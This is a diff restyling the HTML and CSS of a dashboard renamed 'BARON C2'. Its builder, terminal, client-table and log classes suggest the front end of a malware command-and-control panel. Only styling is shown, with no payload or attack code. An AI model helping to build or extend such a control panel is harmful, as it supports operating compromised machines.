@@ -3,694 +3,472 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BARON · SOVEREIGN EDITION</title>
-<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<title>BARON C2 · ABSOLUTE GOD</title>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <style>
-  :root {
-    --gold: #D4AF37; 
-    --gold-dim: color-mix(in srgb, var(--gold) 18%, transparent);
-    --gold-glow: color-mix(in srgb, var(--gold) 35%, transparent);
-    --bg0: #020205; --bg1: rgba(5,5,10,.80); --bg2: rgba(10,10,18,.7);
-    --surface: rgba(12,12,20,.6); --border: color-mix(in srgb, var(--gold) 15%, transparent);
-    --text: #ffffff; --text-dim: rgba(255,255,255,.6);
-    --green: #2de076; --red: #ff4a6b; --blue: #5b9fff;
-    --mono: 'JetBrains Mono', monospace; --sans: 'Outfit', sans-serif;
-    --radius: 20px; --blur: 40px; /* Увеличен blur для сильного эффекта матового стекла */
-    --transition-slow: all 0.7s cubic-bezier(0.16, 1, 0.3, 1);
-  }
-  
-  /* Theming Override from LocalStorage */
-  :root[data-theme="sapphire"] { --gold: #2f80ed; }
-  :root[data-theme="emerald"] { --gold: #2ed573; }
-  :root[data-theme="amethyst"] { --gold: #9b59b6; }
-  :root[data-theme="ruby"] { --gold: #ff4757; }
-  *{margin:0;padding:0;box-sizing:border-box}
-  html,body{height:100%;overflow:hidden;font-family:var(--sans);background:var(--bg0);color:var(--text)}
-  ::-webkit-scrollbar{width:4px} ::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+/* ─── CSS Variables & Core ─── */
+:root {
+  --gold: #D4AF37; --gold-glow: rgba(212,175,55,0.4); --gold-dim: rgba(212,175,55,0.15);
+  --bg-dark: #020305; --bg-panel: rgba(10,12,18,0.55);
+  --text: #ffffff; --text-dim: rgba(255,255,255,0.6);
+  --border: rgba(255,255,255,0.08); --border-bright: rgba(255,255,255,0.25);
+  --sans: 'Outfit', sans-serif; --mono: 'JetBrains Mono', monospace;
+  --blur: 40px; --radius: 24px;
+  --red: #ff3b5c; --green: #00ff88; --blue: #00e5ff;
+}
+:root[data-theme="sapphire"] { --gold: #00e5ff; --gold-glow: rgba(0,229,255,0.4); --gold-dim: rgba(0,229,255,0.15); }
+:root[data-theme="emerald"] { --gold: #00ff88; --gold-glow: rgba(0,255,136,0.4); --gold-dim: rgba(0,255,136,0.15); }
+:root[data-theme="ruby"] { --gold: #ff3b5c; --gold-glow: rgba(255,59,92,0.4); --gold-dim: rgba(255,59,92,0.15); }
+:root[data-theme="amethyst"] { --gold: #b05bff; --gold-glow: rgba(176,91,255,0.4); --gold-dim: rgba(176,91,255,0.15); }
 
-  /* ─── Liquid Mesh Background ─── */
-  .canvas {
-    position: fixed; inset: 0; z-index: 0;
-    background: var(--bg0);
-    overflow: hidden;
-  }
-  .mesh-blob {
-    position: absolute;
-    filter: blur(120px);
-    border-radius: 50%;
-    opacity: 0.6;
-    animation: drift 20s infinite alternate cubic-bezier(0.4, 0, 0.2, 1);
-    mix-blend-mode: screen;
-  }
-  @keyframes drift {
-    0%   { transform: translate(0, 0) scale(1) rotate(0deg); }
-    50%  { transform: translate(15vw, 15vh) scale(1.1) rotate(180deg); }
-    100% { transform: translate(-10vw, -15vh) scale(0.9) rotate(360deg); }
-  }
-  .blob-1 {
-    width: 60vw; height: 60vw;
-    background: radial-gradient(circle, var(--gold-glow), transparent 70%);
-    top: -20vh; left: -20vw;
-    animation-duration: 25s;
-  }
-  .blob-2 {
-    width: 50vw; height: 50vw;
-    background: radial-gradient(circle, rgba(91,159,255,0.2), transparent 70%);
-    bottom: -20vh; right: -10vw;
-    animation-duration: 30s;
-    animation-delay: -5s;
-  }
-  .blob-3 {
-    width: 40vw; height: 40vw;
-    background: radial-gradient(circle, rgba(255,74,107,0.1), transparent 70%);
-    top: 30vh; left: 40vw;
-    animation-duration: 22s;
-    animation-delay: -10s;
-  }
-  .glass-overlay {
-    position: absolute; inset: 0;
-    backdrop-filter: blur(80px) saturate(180%);
-    z-index: 1;
-  }
+* { margin:0; padding:0; box-sizing:border-box; }
+html, body { height:100%; overflow:hidden; background:var(--bg-dark); color:var(--text); font-family:var(--sans); }
+::-webkit-scrollbar { width:4px; height:4px; } ::-webkit-scrollbar-thumb { background:var(--gold-dim); border-radius:4px; }
 
-  /* ─── Login ─── */
-  #login{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;transition:opacity .7s ease}
-  .login-wrap{width:400px;animation:fadeUp .6s ease}
-  .login-card{background:var(--bg1);backdrop-filter:blur(var(--blur));border:1px solid var(--border);border-radius:24px;padding:48px 40px;text-align:center;
-    box-shadow:0 0 60px rgba(212,175,55,.05),0 30px 60px rgba(0,0,0,.6)}
-  .login-logo{font-size:2.6rem;font-weight:900;letter-spacing:10px;
-    background:linear-gradient(135deg,#fff 30%,var(--gold));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
-  .login-sub{font-size:.7rem;letter-spacing:4px;color:var(--gold);opacity:.7;text-transform:uppercase;margin-bottom:36px}
-  .inp{width:100%;padding:14px 18px;margin:8px 0;background:rgba(255,255,255,.04);border:1px solid var(--border);
-    border-radius:12px;color:var(--text);font-size:.95rem;font-family:var(--sans);outline:none;transition:.3s}
-  .inp:focus{border-color:var(--gold);box-shadow:0 0 0 3px var(--gold-dim)}
-  .btn-login{width:100%;padding:15px;margin-top:20px;background:linear-gradient(135deg,var(--gold),#b8871e);
-    color:#000;font-weight:800;font-size:1rem;letter-spacing:2px;border:none;border-radius:12px;cursor:pointer;transition:.3s;font-family:var(--sans)}
-  .btn-login:hover{transform:translateY(-2px);box-shadow:0 8px 30px var(--gold-glow)}
-  .err{color:var(--red);font-size:.85rem;margin-top:14px;min-height:20px}
+/* ─── 3D Environment & FX ─── */
+#three-canvas { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:0; background:radial-gradient(ellipse at center, #05070a 0%, #000000 100%); }
+.scanlines { position:fixed; inset:0; z-index:1; pointer-events:none; background:linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.1) 50%, rgba(0,0,0,0.1)); background-size:100% 4px; opacity:0.3; }
+.vignette { position:fixed; inset:0; z-index:2; pointer-events:none; background:radial-gradient(circle at center, transparent 40%, rgba(0,0,0,0.8) 120%); }
 
-  /* ─── Layout ─── */
-  #shell{display:none;grid-template-columns:260px 1fr;height:100vh;position:relative;z-index:1}
+/* ─── HUD Layout (No Sidebar) ─── */
+#hud { position:fixed; inset:0; z-index:10; pointer-events:none; display:none; perspective:1200px; padding:40px; gap:40px; }
+.panel {
+  pointer-events:auto; background:var(--bg-panel); backdrop-filter:blur(var(--blur)) saturate(180%);
+  border:1px solid var(--border); border-top:1px solid var(--border-bright);
+  border-radius:var(--radius); box-shadow:0 30px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1);
+  display:flex; flex-direction:column; transition:0.6s cubic-bezier(0.16,1,0.3,1);
+}
+.panel:hover { border-color:var(--gold-dim); box-shadow:0 30px 80px rgba(0,0,0,0.8), 0 0 40px var(--gold-dim); padding-left:1px; }
 
-  /* ─── Sidebar ─── */
-  .sidebar{background:rgba(6,6,14,.95);backdrop-filter:blur(40px);border-right:1px solid var(--border);
-    display:flex;flex-direction:column;gap:0;padding:0;overflow:hidden}
-  .sbar-top{padding:32px 24px 24px;border-bottom:1px solid var(--border)}
-  .sbar-logo{font-size:1.7rem;font-weight:900;letter-spacing:8px;
-    background:linear-gradient(135deg,#fff,var(--gold));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-  .sbar-ver{font-size:.65rem;color:var(--gold);letter-spacing:2px;opacity:.6;margin-top:2px}
-  .sbar-status{display:flex;align-items:center;gap:8px;margin-top:16px;
-    font-size:.75rem;color:var(--text-dim);font-family:var(--mono)}
-  .dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 2s infinite}
+/* ─── Left Panel: Navigation & Core ─── */
+#left-panel { width:280px; height:calc(100vh - 80px); transform:rotateY(5deg); pointer-events:auto; z-index:20; }
+.brand { padding:30px; border-bottom:1px solid var(--border); text-align:center; }
+.brand-logo { font-size:2rem; font-weight:900; letter-spacing:10px; background:linear-gradient(135deg,#fff,var(--gold)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-shadow:0 0 20px var(--gold-dim); }
+.brand-sub { font-size:0.65rem; color:var(--gold); letter-spacing:4px; text-transform:uppercase; margin-top:4px; }
+.nav { flex:1; padding:20px; overflow-y:auto; display:flex; flex-direction:column; gap:8px; }
+.nav-item { padding:14px 20px; border-radius:14px; font-size:0.9rem; font-weight:500; color:var(--text-dim); cursor:pointer; display:flex; align-items:center; gap:16px; transition:0.3s; border:1px solid transparent; }
+.nav-item:hover { color:var(--text); background:rgba(255,255,255,0.03); transform:translateX(6px); }
+.nav-item.active { color:var(--gold); background:var(--gold-dim); border-color:rgba(255,255,255,0.1); box-shadow:0 0 20px var(--gold-dim); transform:translateX(10px); }
+.nav-item svg { width:20px; height:20px; }
+.left-footer { padding:20px; border-top:1px solid var(--border); }
+.theme-picker { display:flex; gap:10px; justify-content:center; margin-bottom:16px; }
+.theme-dot { width:16px; height:16px; border-radius:50%; cursor:pointer; transition:0.3s; border:1px solid rgba(255,255,255,0.2); box-shadow:0 0 10px rgba(0,0,0,0.5); }
+.theme-dot:hover { transform:scale(1.4); }
 
-  .nav{flex:1;padding:16px 12px;overflow-y:auto;display:flex;flex-direction:column;gap:4px}
-  .nav-label{font-size:.6rem;letter-spacing:3px;color:var(--text-dim);padding:12px 12px 6px;text-transform:uppercase}
-  .nav-item{padding:11px 14px;border-radius:10px;cursor:pointer;transition:.25s;
-    display:flex;align-items:center;gap:12px;color:var(--text-dim);font-size:.88rem;border:1px solid transparent}
-  .nav-item svg{width:16px;height:16px;flex-shrink:0}
-  .nav-item:hover{background:var(--gold-dim);color:var(--text);border-color:var(--border)}
-  .nav-item.active{background:var(--gold-dim);color:var(--gold);border-color:var(--gold-glow);
-    box-shadow:inset 0 0 20px var(--gold-dim),0 0 15px rgba(212,175,55,.05)}
+/* ─── Center Stage: Dynamic Content ─── */
+#center-stage { flex:1; height:calc(100vh - 80px); display:flex; flex-direction:column; transform:translateZ(0); pointer-events:none; }
+.cs-header { height:80px; margin-bottom:20px; display:flex; align-items:center; justify-content:space-between; background:var(--bg-panel); backdrop-filter:blur(var(--blur)); border-radius:var(--radius); border:1px solid var(--border); border-top:1px solid var(--border-bright); padding:0 30px; pointer-events:auto; box-shadow:0 20px 40px rgba(0,0,0,0.5); }
+.pg-title { font-size:1.4rem; font-weight:700; letter-spacing:2px; text-transform:uppercase; text-shadow:0 2px 10px rgba(0,0,0,0.5); }
+.cs-header-info { display:flex; gap:20px; align-items:center; }
+.time-chip { font-family:var(--mono); color:var(--gold); font-size:0.85rem; background:var(--gold-dim); padding:8px 16px; border-radius:20px; border:1px solid rgba(255,255,255,0.1); box-shadow:0 0 15px var(--gold-dim); }
 
-  .sbar-bot{padding:16px 12px;border-top:1px solid var(--border)}
-  .usr-card{padding:12px 14px;border-radius:10px;background:var(--gold-dim);border:1px solid var(--border);
-    display:flex;align-items:center;gap:10px}
-  .usr-av{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--gold),#8b6914);
-    display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.8rem;color:#000}
-  .usr-name{font-size:.85rem;font-weight:600}
-  .usr-role{font-size:.7rem;color:var(--gold);opacity:.8}
-  .btn-logout{width:100%;margin-top:8px;padding:9px;background:rgba(255,74,107,.1);border:1px solid rgba(255,74,107,.2);
-    color:var(--red);border-radius:8px;cursor:pointer;font-size:.8rem;transition:.2s;font-family:var(--sans)}
-  .btn-logout:hover{background:rgba(255,74,107,.2)}
+.page { display:none; flex:1; flex-direction:column; gap:24px; animation:glitchIn 0.5s cubic-bezier(0.16,1,0.3,1); pointer-events:auto; overflow-y:auto; padding-right:10px; }
+.page.active { display:flex; }
+@keyframes glitchIn { 0% { opacity:0; transform:scale(0.95) translateY(20px); filter:blur(10px); } 100% { opacity:1; transform:scale(1) translateY(0); filter:blur(0); } }
 
-  /* ─── Main ─── */
-  .main{display:flex;flex-direction:column;overflow:hidden}
-  /* ─── Sovereign Island (Dynamic Top Bar) ─── */
-  .sovereign-wrapper {
-    position: absolute; top: 16px; left: 0; right: 0;
-    display: flex; justify-content: center; z-index: 50;
-    pointer-events: none;
-  }
-  .sovereign-island {
-    background: #000;
-    border: 1px solid rgba(255,255,255,0.08);
-    border-radius: 40px;
-    height: 48px; min-width: 260px; padding: 0 16px;
-    display: flex; align-items: center; justify-content: space-between;
-    transition: var(--transition-slow);
-    pointer-events: auto;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.8), inset 0 0 15px rgba(255,255,255,0.02);
-    overflow: hidden; cursor: pointer;
-  }
-  .sovereign-island:hover { transform: scale(1.02); }
-  .sovereign-island.expanded { 
-    height: 64px; min-width: 450px; border-radius: 32px; 
-    background: rgba(10,10,18,0.95); backdrop-filter: blur(20px); 
-    border-color: var(--gold-dim); 
-  }
-  
-  .isl-left { display: flex; align-items: center; gap: 12px; }
-  .isl-center { 
-    flex: 1; text-align: center; overflow: hidden; white-space: nowrap; 
-    color: var(--gold); font-size: 0.8rem; font-weight: 500; 
-    opacity: 0; transition: 0.4s; padding: 0 10px;
-  }
-  .sovereign-island.expanded .isl-center { opacity: 1; }
-  .isl-right { display: flex; align-items: center; gap: 12px; }
-  
-  .theme-picker { display: flex; gap: 6px; }
-  .theme-dot { 
-    width: 14px; height: 14px; border-radius: 50%; cursor: pointer; 
-    transition: 0.2s; border: 1px solid rgba(255,255,255,0.1); 
-  }
-  .theme-dot:hover { transform: scale(1.3); }
+/* ─── Right Panel: Terminal & Logs ─── */
+#right-panel { width:340px; height:calc(100vh - 80px); transform:rotateY(-5deg); pointer-events:auto; z-index:20; }
+.rp-header { padding:20px; border-bottom:1px solid var(--border); font-size:0.8rem; font-weight:700; letter-spacing:3px; text-transform:uppercase; color:var(--gold); text-align:center; }
+.log-stream { flex:1; padding:20px; overflow-y:auto; font-family:var(--mono); font-size:0.75rem; display:flex; flex-direction:column; gap:12px; }
+.log-entry { padding-left:12px; border-left:2px solid var(--border); animation:fadeLeft 0.3s ease; line-height:1.6; }
+@keyframes fadeLeft { 0%{opacity:0;transform:translateX(10px);} 100%{opacity:1;transform:translateX(0);} }
+.log-time { color:var(--text-dim); margin-right:8px; }
+.log-info { border-color:var(--blue); } .log-info .log-msg { color:var(--text); }
+.log-warn { border-color:var(--gold); } .log-warn .log-msg { color:var(--gold); }
+.log-error { border-color:var(--red); } .log-error .log-msg { color:var(--red); text-shadow:0 0 8px rgba(255,59,92,0.6); }
 
-  .pg-title{font-size:1.1rem;font-weight:700}
-  .time-chip{font-family:var(--mono);font-size:.75rem;color:var(--text);
-    background:rgba(255,255,255,0.05);padding:4px 10px;border-radius:20px}
+/* ─── UI Components ─── */
+.stat-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:20px; }
+.stat-card {
+  background:linear-gradient(135deg, rgba(255,255,255,0.05) 0%, transparent 100%), rgba(0,0,0,0.4);
+  backdrop-filter:blur(20px); border:1px solid var(--border); border-top:1px solid var(--border-bright);
+  padding:24px; border-radius:20px; position:relative; overflow:hidden; transition:0.4s;
+  box-shadow:0 10px 30px rgba(0,0,0,0.5); cursor:grab;
+}
+.stat-card:hover { transform:translateY(-5px) scale(1.02); border-color:var(--gold); box-shadow:0 20px 40px rgba(0,0,0,0.8), 0 0 30px var(--gold-dim); }
+.stat-card::after { content:''; position:absolute; top:-50px; right:-50px; width:100px; height:100px; background:radial-gradient(circle, var(--gold-glow), transparent 70%); border-radius:50%; opacity:0; transition:0.5s; }
+.stat-card:hover::after { opacity:1; transform:scale(2); }
+.stat-title { font-size:0.7rem; text-transform:uppercase; letter-spacing:3px; color:var(--gold); margin-bottom:8px; font-weight:600; }
+.stat-val { font-size:3.5rem; font-weight:900; line-height:1; letter-spacing:-2px; text-shadow:0 5px 20px rgba(255,255,255,0.3); }
 
-  .content{flex:1;overflow-y:auto;padding:32px 36px;display:flex;flex-direction:column;gap:32px}
+.glass-box { background:rgba(0,0,0,0.3); backdrop-filter:blur(20px); border:1px solid var(--border); border-radius:20px; padding:24px; transition:0.4s; overflow:hidden; }
+.glass-box:hover { border-color:rgba(255,255,255,0.15); box-shadow:0 15px 35px rgba(0,0,0,0.6); }
+.box-title { font-size:1rem; font-weight:700; margin-bottom:20px; letter-spacing:1px; display:flex; align-items:center; justify-content:space-between; }
 
-  /* ─── Liquid Glass Cards ─── */
-  .card{
-    background: linear-gradient(135deg, rgba(255,255,255,0.03) 0%, rgba(255,255,255,0) 100%), var(--surface);
-    backdrop-filter: blur(var(--blur)) saturate(180%);
-    border: 1px solid rgba(255,255,255,0.06); border-top: 1px solid rgba(255,255,255,0.15);
-    border-radius: var(--radius); transition: var(--transition-slow);
-    box-shadow: 0 16px 40px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
-  }
-  .card:hover{
-    border-color: rgba(212,175,55,.2);
-    box-shadow: 0 20px 50px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.2), 0 0 40px var(--gold-dim);
-    transform: translateY(-2px);
-  }
-  .card-head{padding:20px 24px;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;align-items:center;justify-content:space-between}
-  .card-title{font-size:.9rem;font-weight:600;letter-spacing:.5px; text-shadow: 0 2px 10px rgba(0,0,0,0.5);}
-  .card-badge{font-size:.7rem;padding:4px 10px;border-radius:20px;font-family:var(--mono)}
-  .card-body{padding:24px}
+/* ─── Tables ─── */
+.table-wrap { overflow-x:auto; }
+table { width:100%; border-collapse:collapse; text-align:left; }
+th { padding:14px; font-size:0.65rem; text-transform:uppercase; letter-spacing:4px; color:var(--gold); border-bottom:1px solid var(--border); }
+td { padding:16px 14px; font-size:0.85rem; border-bottom:1px solid rgba(255,255,255,0.03); vertical-align:middle; transition:0.2s; }
+tr:hover td { background:rgba(255,255,255,0.02); color:white; }
+.pill { padding:4px 10px; border-radius:12px; font-size:0.75rem; font-weight:600; text-transform:uppercase; letter-spacing:1px; display:inline-flex; align-items:center; gap:6px; background:rgba(255,255,255,0.05); }
+.pill-on { color:var(--green); background:rgba(0,255,136,0.1); border:1px solid rgba(0,255,136,0.3); box-shadow:0 0 10px rgba(0,255,136,0.2); }
+.pill-off { color:var(--red); background:rgba(255,59,92,0.1); border:1px solid rgba(255,59,92,0.3); }
+.dot { width:6px; height:6px; border-radius:50%; background:currentColor; box-shadow:0 0 8px currentColor; }
 
-  /* ─── Stats ─── */
-  .stats-grid{display:grid;grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));gap:24px}
-  .stat{
-    padding:24px;border-radius:var(--radius);
-    background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0) 100%), var(--surface);
-    backdrop-filter: blur(40px) saturate(200%);
-    border: 1px solid rgba(255,255,255,0.08); border-top: 1px solid rgba(255,255,255,0.18);
-    position:relative;overflow:hidden;transition:var(--transition-slow);
-    box-shadow: 0 10px 30px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
-    cursor: grab;
-  }
-  .stat:active { cursor: grabbing; transform: scale(0.96); }
-  .stat:hover{
-    transform:translateY(-6px) scale(1.02);
-    border-color:rgba(212,175,55,.4);
-    box-shadow: 0 20px 40px rgba(0,0,0,0.7), 0 0 30px var(--gold-dim);
-  }
-  .stat::before{content:'';position:absolute;top:-40px;right:-40px;width:120px;height:120px;border-radius:50%;
-    background:radial-gradient(circle, var(--gold-glow),transparent); opacity: 0.5; transition: 0.8s;}
-  .stat:hover::before { transform: scale(1.5); opacity: 1; }
-  .stat-label{font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--gold);margin-bottom:10px; font-weight:600;}
-  .stat-val{font-size:3rem;font-weight:800;line-height:1;color:#fff; text-shadow: 0 4px 20px rgba(255,255,255,0.2);}
-  .stat-hint{font-size:.75rem;color:var(--text-dim);margin-top:8px;font-family:var(--mono)}
+/* ─── Buttons & Inputs ─── */
+.btn { padding:12px 24px; border-radius:12px; font-family:var(--sans); font-weight:700; font-size:0.85rem; letter-spacing:1px; cursor:pointer; transition:0.3s; border:none; outline:none; display:inline-flex; align-items:center; gap:8px; justify-content:center; }
+.btn-prime { background:linear-gradient(135deg, var(--gold), color-mix(in srgb, var(--gold) 50%, black)); color:#000; box-shadow:0 5px 15px var(--gold-dim), inset 0 1px 0 rgba(255,255,255,0.5); }
+.btn-prime:hover { transform:translateY(-2px); box-shadow:0 8px 25px var(--gold-glow), inset 0 1px 0 rgba(255,255,255,0.8); }
+.btn-prime:active { transform:scale(0.95); }
+.btn-ghost { background:rgba(255,255,255,0.03); color:var(--text); border:1px solid rgba(255,255,255,0.1); backdrop-filter:blur(10px); }
+.btn-ghost:hover { background:rgba(255,255,255,0.1); border-color:var(--gold); color:#fff; transform:translateY(-2px); box-shadow:0 5px 15px rgba(0,0,0,0.5); }
+.btn-danger { background:rgba(255,59,92,0.15); color:var(--red); border:1px solid rgba(255,59,92,0.3); }
+.btn-danger:hover { background:rgba(255,59,92,0.3); color:#fff; box-shadow:0 0 20px rgba(255,59,92,0.5); }
 
-  /* ─── Table ─── */
-  .tbl-wrap{overflow-x:auto}
-  table{width:100%;border-collapse:collapse}
-  th{padding:12px 16px;text-align:left;font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--gold);border-bottom:1px solid var(--border)}
-  td{padding:16px 16px;border-bottom:1px solid rgba(255,255,255,.04);font-size:.85rem;vertical-align:middle}
-  tr:last-child td{border:none}
-  tr:hover td{background:rgba(255,255,255,.02)}
-  .pill{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;font-size:.72rem;font-family:var(--mono)}
-  .pill-green{background:rgba(45,224,118,.12);color:var(--green);border:1px solid rgba(45,224,118,.2)}
-  .pill-red{background:rgba(255,74,107,.12);color:var(--red);border:1px solid rgba(255,74,107,.2)}
-  .pill-dot{width:5px;height:5px;border-radius:50%;background:currentColor}
-  .cid{font-family:var(--mono);font-size:.75rem;color:var(--text-dim)}
+.input { width:100%; padding:14px 18px; background:rgba(0,0,0,0.4); border:1px solid var(--border); border-radius:12px; color:#fff; font-family:var(--sans); font-size:0.9rem; transition:0.3s; outline:none; }
+.input:focus { border-color:var(--gold); box-shadow:0 0 0 3px var(--gold-dim), 0 10px 20px rgba(0,0,0,0.5); background:rgba(0,0,0,0.6); }
 
-  /* ─── Btn & Inputs (Liquid Glass) ─── */
-  .btn{
-    padding:10px 22px;border-radius:12px;cursor:pointer;font-size:.85rem;font-family:var(--sans);
-    border:1px solid transparent;transition:var(--transition-slow);font-weight:600;
-    backdrop-filter: blur(10px);
-  }
-  .btn-gold{
-    background: linear-gradient(135deg, var(--gold), color-mix(in srgb, var(--gold) 60%, black));
-    color:#000;border:none; box-shadow: 0 4px 15px var(--gold-dim), inset 0 1px 0 rgba(255,255,255,0.4);
-  }
-  .btn-gold:hover{
-    box-shadow:0 8px 25px var(--gold-glow), inset 0 1px 0 rgba(255,255,255,0.6);
-    transform:translateY(-2px) scale(1.03);
-  }
-  .btn-gold:active{ transform: scale(0.95); }
-  
-  .btn-outline{background:rgba(255,255,255,0.03);border: 1px solid rgba(255,255,255,0.1);color:var(--text);}
-  .btn-outline:hover{background:rgba(255,255,255,0.08);border-color:var(--gold);color:#fff; transform: translateY(-2px);}
-  .btn-red{background:rgba(255,74,107,.15);border-color:rgba(255,74,107,.3);color:var(--red)}
-  .btn-red:hover{background:rgba(255,74,107,.3); box-shadow: 0 0 20px rgba(255,74,107, 0.4);}
-  .btn-sm{padding:6px 14px;font-size:.75rem}
+/* ─── Context Menu ─── */
+#ctx-menu { position:fixed; z-index:9999; background:rgba(5,7,12,0.85); backdrop-filter:blur(30px) saturate(200%); border:1px solid var(--border); border-top:1px solid var(--border-bright); border-radius:16px; padding:8px; min-width:240px; box-shadow:0 20px 50px rgba(0,0,0,0.8), 0 0 30px var(--gold-dim); display:none; flex-direction:column; transform-origin:top left; animation:menuIn 0.2s cubic-bezier(0.16,1,0.3,1); }
+@keyframes menuIn { 0%{opacity:0;transform:scale(0.9) translateY(10px);} 100%{opacity:1;transform:scale(1) translateY(0);} }
+#ctx-menu.show { display:flex; }
+.ctx-item { padding:10px 16px; font-size:0.85rem; border-radius:8px; cursor:pointer; transition:0.2s; color:var(--text); display:flex; align-items:center; gap:10px; }
+.ctx-item:hover { background:var(--gold-dim); color:var(--gold); padding-left:22px; }
+.ctx-header { padding:8px 16px; font-size:0.6rem; text-transform:uppercase; letter-spacing:3px; color:var(--gold); font-weight:700; opacity:0.7; }
+.ctx-divider { height:1px; background:var(--border); margin:6px 0; }
+.ctx-danger:hover { background:rgba(255,59,92,0.15); color:var(--red); padding-left:22px; }
 
-  /* ─── Terminal ─── */
-  .terminal{background:#000;border:1px solid var(--border);border-radius:10px;
-    font-family:var(--mono);font-size:.78rem;overflow:hidden}
-  .term-bar{padding:10px 16px;background:rgba(255,255,255,.04);border-bottom:1px solid var(--border);
-    display:flex;align-items:center;gap:8px}
-  .term-dot{width:10px;height:10px;border-radius:50%}
+/* ─── Loader & Terminal ─── */
+.terminal { background:#000; border:1px solid var(--border); border-radius:14px; overflow:hidden; font-family:var(--mono); font-size:0.8rem; box-shadow:inset 0 0 30px rgba(0,0,0,1); }
+.term-bar { background:rgba(255,255,255,0.05); padding:12px 16px; display:flex; gap:8px; border-bottom:1px solid var(--border); }
+.term-dot { width:12px; height:12px; border-radius:50%; }
+.term-body { padding:16px; height:300px; overflow-y:auto; color:#0f0; white-space:pre-wrap; }
 
-  /* ─── Context Menu ─── */
-  #ctx-menu {
-    position: fixed; z-index: 9999; background: var(--bg1); backdrop-filter: blur(var(--blur));
-    border: 1px solid var(--border); border-radius: 12px; min-width: 220px;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.8), 0 0 15px rgba(212,175,55,0.1); display: none;
-    flex-direction: column; padding: 8px; overflow: hidden;
-  }
-  #ctx-menu.show { display: flex; animation: fadeUp .2s ease }
-  .ctx-item {
-    padding: 10px 16px; font-size: .85rem; color: var(--text); border-radius: 6px;
-    cursor: pointer; display: flex; align-items: center; gap: 8px; transition: .2s;
-  }
-  .ctx-item:hover { background: var(--gold-dim); color: var(--gold); }
-  .ctx-item.danger { color: var(--red); }
-  .ctx-item.danger:hover { background: rgba(255,74,107,.15); }
-  .ctx-divider { height: 1px; background: rgba(255,255,255,.05); margin: 6px 0; }
-  .ctx-header { padding: 8px 16px; font-size: .7rem; letter-spacing: 2px; text-transform: uppercase; color: var(--text-dim); }
-
-    display:flex;align-items:center;gap:8px}
-  .term-dot{width:10px;height:10px;border-radius:50%}
-  .term-body{padding:14px 18px;height:220px;overflow-y:auto;color:#a0f0a0;line-height:1.7}
-  .term-inp-row{display:flex;align-items:center;gap:0;padding:8px 18px;border-top:1px solid var(--border)}
-  .term-prompt{color:var(--gold);white-space:nowrap;font-family:var(--mono)}
-  .term-inp{flex:1;background:none;border:none;outline:none;color:#fff;font-family:var(--mono);font-size:.78rem;padding:0 10px}
-
-  /* ─── Builder ─── */
-  .builder-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
-  .form-group{margin-bottom:16px}
-  .form-label{display:block;font-size:.72rem;letter-spacing:2px;color:var(--gold);text-transform:uppercase;margin-bottom:8px}
-  .form-input{width:100%;padding:11px 14px;background:rgba(255,255,255,.04);border:1px solid var(--border);
-    border-radius:8px;color:var(--text);font-size:.88rem;outline:none;transition:.25s;font-family:var(--sans)}
-  .form-input:focus{border-color:var(--gold);box-shadow:0 0 0 3px var(--gold-dim)}
-  .form-select{width:100%;padding:11px 14px;background:rgba(8,8,18,.9);border:1px solid var(--border);
-    border-radius:8px;color:var(--text);font-size:.88rem;outline:none;cursor:pointer;font-family:var(--sans)}
-  .toggle-row{display:flex;align-items:center;justify-content:space-between;
-    padding:12px 0;border-bottom:1px solid rgba(255,255,255,.05)}
-  .toggle-label{font-size:.85rem}
-  .toggle-sub{font-size:.72rem;color:var(--text-dim);margin-top:2px}
-  input[type=checkbox]{accent-color:var(--gold);width:16px;height:16px;cursor:pointer}
-
-  /* ─── Log ─── */
-  .log-entry{display:flex;gap:14px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.03);align-items:flex-start}
-  .log-time{font-family:var(--mono);font-size:.72rem;color:var(--text-dim);white-space:nowrap;padding-top:1px}
-  .log-msg{font-size:.83rem;line-height:1.5}
-  .log-info .log-msg{color:var(--text)}
-  .log-warn .log-msg{color:#ffd26e}
-  .log-error .log-msg{color:var(--red)}
-
-  /* ─── Alert ─── */
-  .alert-banner{color:var(--red);background:rgba(255,74,107,.08);border:1px solid rgba(255,74,107,.2);
-    border-radius:10px;padding:14px 18px;display:flex;align-items:center;gap:12px;margin-bottom:16px;font-size:.85rem}
-
-  /* ─── Modal ─── */
-  #modal-overlay{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.75);backdrop-filter:blur(8px);
-    display:none;align-items:center;justify-content:center}
-  #modal-overlay.show{display:flex}
